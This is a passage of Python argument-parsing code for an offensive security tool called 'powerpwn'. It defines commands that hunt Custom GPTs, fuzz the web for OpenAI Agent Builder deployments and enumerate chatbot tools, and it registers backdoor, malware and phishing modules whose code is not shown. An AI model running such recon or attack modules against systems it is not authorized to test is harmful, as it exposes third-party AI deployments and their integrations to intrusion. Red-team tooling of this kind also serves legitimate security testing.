    custom_gpt = parser.add_parser(
        "custom-gpt-hunter",
        description="Discover and catalog Custom GPTs on ChatGPT (requires a valid ChatGPT account).",
        help="Discover and catalog Custom GPTs on ChatGPT (requires a valid ChatGPT account).",
        epilog="""
Examples:
  powerpwn custom-gpt-hunter "excel"
  powerpwn custom-gpt-hunter "data analysis" 5
  powerpwn custom-gpt-hunter "security" 10
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    custom_gpt.add_argument("search_query", type=str, help="Search term for Custom GPTs (e.g., 'excel', 'data analysis')")
    custom_gpt.add_argument(
        "additional_pages", type=int, nargs="?", default=0, help="Number of additional pages to fetch (default: 0). Each page contains ~10 GPTs."
    )


def module_agent_builder_scan(parser: "_SubParsersAction[argparse.ArgumentParser]") -> None:
    agent_builder = parser.add_parser(
        "agent-builder-hunter",
        description="Discover and recon OpenAI Agent Builder deployments in the wild",
        help="Discover and recon OpenAI Agent Builder deployments in the wild.",
        epilog="""
Examples:
  powerpwn agent-builder-hunter scan
  powerpwn agent-builder-hunter scan -w custom_wordlist.txt -r 50
  powerpwn agent-builder-hunter tools-recon -u https://example.com/agent
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    agent_builder_subparsers = agent_builder.add_subparsers(help="agent_builder_subcommand", dest="agent_builder_subcommand")

    # Scan subcommand
    scan = agent_builder_subparsers.add_parser(
        "scan",
        description="Discover OpenAI Agent Builder deployments using ffuf.",
        help="Discover OpenAI Agent Builder deployments using ffuf.",
        epilog="""
Examples:
  powerpwn agent-builder-hunter scan
  powerpwn agent-builder-hunter scan -w wordlist.txt -o results.txt
  powerpwn agent-builder-hunter scan -r 50 -t 20 --run-duration 30
  powerpwn agent-builder-hunter scan --timeout 300 --timeout-per-endpoint
  powerpwn agent-builder-hunter scan --reset
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    scan.add_argument("-w", "--wordlist", type=str, help="Path to wordlist file. If not provided, uses bundled default wordlist.")
    scan.add_argument("-o", "--output", type=str, help="Output file path for found URLs. Default: found_agent_builder_deployments_<timestamp>.txt")
    scan.add_argument("--run-duration", type=int, default=20, help="How long to run ffuf before pausing (seconds). Default: 20")
    scan.add_argument("--pause-duration", type=int, default=15, help="How long to pause between ffuf runs (seconds). Default: 15")
    scan.add_argument("-r", "--rate", type=int, default=40, help="Rate limit for ffuf requests per second. Default: 40")
    scan.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads for ffuf. Default: 10")
    scan.add_argument("--filter-codes", type=str, default="404,403", help="HTTP status codes to filter out (comma-separated). Default: 404,403")
    scan.add_argument(
        "--timeout",
        type=int,
        help="Timeout in seconds. Use with --timeout-per-endpoint to set per-endpoint timeout, otherwise applies to entire scan.",
    )
    scan.add_argument(
        "--timeout-per-endpoint",
        action="store_true",
        help="Apply timeout to each endpoint individually instead of the entire scan. Requires --timeout.",
    )
    scan.add_argument("--reset", action="store_true", help="Reset/clear all progress files and start scan from beginning.")

    # Tools recon subcommand
    tools_recon = agent_builder_subparsers.add_parser(
        "tools-recon",
        description="Enumerate tools and integrations from Agent Builder chatbots.",
        help="Enumerate tools and integrations from Agent Builder chatbots.",
        epilog="""
Examples:
  powerpwn agent-builder-hunter tools-recon -u https://openai-chatkit-example123.vercel.app
  powerpwn agent-builder-hunter tools-recon -f agent_urls.txt
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    tools_recon.add_argument("-u", "--url", type=str, help="Single Agent Builder chatbot URL to scan.")
    tools_recon.add_argument("-f", "--file", type=str, help="File containing list of Agent Builder chatbot URLs (one per line).")


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(formatter_class=GroupedCommandHelpFormatter)
    parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level")
    command_subparsers: "_SubParsersAction[argparse.ArgumentParser]" = parser.add_subparsers(help="command", dest="command")

    module_dump(command_subparsers)
    module_recon(command_subparsers)
    module_tenant_mcp_recon(command_subparsers)
    module_gui(command_subparsers)
    module_backdoor(command_subparsers)
    module_nocodemalware(command_subparsers)
    module_phishing(command_subparsers)
    module_copilot(command_subparsers)
    module_copilot_studio(command_subparsers)
    module_powerpages(command_subparsers)
    module_llm_hound(command_subparsers)
    module_custom_gpt_hunter(command_subparsers)
    module_agent_builder_scan(command_subparsers)

    args = parser.parse_args()

    return args
